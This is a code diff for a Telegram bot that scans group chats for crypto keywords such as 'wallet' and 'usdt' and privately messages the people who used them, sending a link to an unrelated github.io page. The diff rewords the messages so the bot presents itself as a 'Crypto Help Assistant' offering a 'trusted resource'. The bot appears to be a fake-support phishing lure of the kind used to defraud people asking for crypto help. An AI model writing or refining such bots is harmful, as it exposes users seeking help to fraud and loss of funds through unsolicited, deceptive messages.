@@ -19,7 +19,7 @@ load_dotenv()
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Environment variables (✅ DO NOT put your token here)
+# Environment variables
 TOKEN = os.environ.get("TELEGRAM_TOKEN")
 HELP_LINK = os.environ.get("HELP_LINK", "https://alari12.github.io/MindCarePLC/")
 TRIGGERS = os.environ.get("TRIGGERS", "wallet,usdt,crypto,sol,help")
@@ -32,13 +32,18 @@ if not TOKEN:
 # /start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "👋 Hi! I monitor groups for crypto keywords and will DM you with help. "
-        "Make sure you’ve started me in private first!"
+        "👋 Welcome! I’m your Crypto Help Assistant.\n\n"
+        "I provide quick guidance and trusted resources for your crypto needs. "
+        "Type /help to get started or just mention crypto-related terms in a group."
     )
 
 # /help command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"Here’s your help link:https://alari12.github.io/MindCarePLC/")
+    await update.message.reply_text(
+        f"🤝 I’m here to assist you!\n\n"
+        f"Here’s a reliable resource that can guide you further:\n{HELP_LINK}\n\n"
+        "⚡ If you need more support, just reach out anytime."
+    )
 
 # Monitor group messages
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -55,7 +60,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user = update.message.from_user
             user_id = user.id
             first = user.first_name or "there"
-            dm_text = f"Hey {first}, I noticed you mentioned '{word}'. For help click:https://alari12.github.io/MindCarePLC/"
+            dm_text = (
+                f"Hello {first}, 👋\n\n"
+                "I noticed your message and thought this might help you.\n"
+                f"Here’s a trusted resource: {HELP_LINK}\n\n"
+                "💡 Keep me handy — I’ll assist whenever you need support."
+            )
 
             try:
                 await context.bot.send_message(chat_id=user_id, text=dm_text)
@@ -66,8 +76,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     bot_username = bot_user.username or "this_bot"
                     start_link = f"https://t.me/{bot_username}"
                     fallback = (
-                        f"{user.first_name}, I tried to DM you but couldn’t. "
-                        f"Please start a private chat with me here: {start_link}"
+                        f"{user.first_name}, I wasn’t able to message you directly. "
+                        f"Please start a private chat with me here 👉 {start_link}"
                     )
                     await update.message.reply_text(fallback)
                     logger.info("⚠️ Fallback message sent in group to %s", user_id)
